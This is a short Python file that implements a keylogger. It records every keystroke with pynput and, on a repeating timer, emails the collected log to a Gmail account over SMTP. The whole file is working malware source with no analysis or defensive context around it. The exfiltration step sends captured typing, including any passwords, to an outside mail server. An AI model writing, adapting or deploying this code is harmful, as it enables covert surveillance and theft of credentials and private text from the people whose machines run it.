#!/usr/env/pyhton

import pynput.keyboard
import threading
import smtplib
class Keylogger:
    def __init__(self,t,email,password):
        self.log="keylogger started"
        self.i=t
        self.email=email
        self.password=password
        
    def append_log(self,string):
        self.log=self.log+string
        
    
    def process_key_press(self,key):
        try:
            curr_key=str(key.char)
            self.append_log(str(key.char))
        except AttributeError:
            if key==key.space:
                curr_key=" "      
            else:
                curr_key=" "+str(key)+" "
            self.append_log(curr_key)
    def report(self):
        self.send_email( self.email , self.password ,"\n\n" + self.log)
        self.log=""
        timer=threading.Timer(self.i,self.report)
        timer.start()
    def send_email(self,email,password,msg):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,msg)
        server.quit()
        
        
    def start(self):
        key_lstnr=pynput.keyboard.Listener(on_press=self.process_key_press)
        with key_lstnr:
            self.report()
            key_lstnr.join()
        
